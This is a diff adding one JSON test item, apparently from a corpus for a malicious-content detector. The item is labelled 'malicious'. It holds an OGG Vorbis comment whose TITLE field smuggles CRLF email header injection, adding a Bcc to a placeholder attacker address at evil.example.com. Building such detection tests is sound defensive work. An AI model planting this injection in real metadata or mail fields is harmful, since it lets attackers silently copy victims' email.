@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::email-webfetch::73::binary-variations::2",
+  "base_sample_id": "exp::email-webfetch::73",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -1940920800,
+  "content": "{\n  \"format\": \"ogg\",\n  \"vorbisComment\": {\n    \"vendor\": \"Lavf60.3.100\",\n    \"comments\": [\n      \"TITLE=From: attacker@evil.example.com\\r\\nTo: victim@target.example.com\\r\\nBcc: spy@evil.example.com\\r\\nSubject: Important\\n\",\n      \"ENCODER=libvorbis\"\n    ]\n  }\n}",
+  "content_hash": "6380b39476e8d5ce87c4fb917edc41eb15bf32332951bd2e02c8daace9d63449",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:ogg-comment",
+  "difficulty": "advanced"
+}
